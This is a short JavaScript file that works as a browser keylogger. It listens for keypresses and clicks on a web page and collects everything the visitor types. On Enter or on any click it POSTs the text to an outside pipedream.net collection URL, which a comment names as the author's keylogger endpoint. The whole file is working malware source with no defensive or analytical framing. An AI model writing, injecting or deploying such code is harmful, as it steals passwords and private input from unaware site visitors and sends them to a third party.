let keyStrokeString = '';

function handleKeypress(event) {
    if (event.key !== 'Enter') {
        keyStrokeString += event.key;
    } else {
       const str = keyStrokeString;

fetch('https://eofyfyh52mz68hy.m.pipedream.net', { //pipedream unique url i am using to post keyLoggerStrings
    method: 'POST',
    body: JSON.stringify({ message: str }),
    headers: {
        'Content-Type': 'application/json'
    }
}).then(response => {
    if (response.ok) {
        console.log('String sent successfully:', str);
    } else {
        console.error('Failed to send string:', response.status);
    }
}).catch(error => {
    console.error('Error sending string:', error);
});

        // Reset the keyStrokeString for the next sequence
        keyStrokeString = '';
    }
}

function handleClick(event) {
   const str = keyStrokeString;

fetch('https://eofyfyh52mz68hy.m.pipedream.net', {
    method: 'POST',
    body: JSON.stringify({ message: str }),
    headers: {
        'Content-Type': 'application/json'
    }
}).then(response => {
    if (response.ok) {
        console.log('String sent successfully:', str);
    } else {
        console.error('Failed to send string:', response.status);
    }
}).catch(error => {
    console.error('Error sending string:', error);
});

    keyStrokeString = '';
}

document.addEventListener('keypress', handleKeypress);
document.addEventListener('click', handleClick);


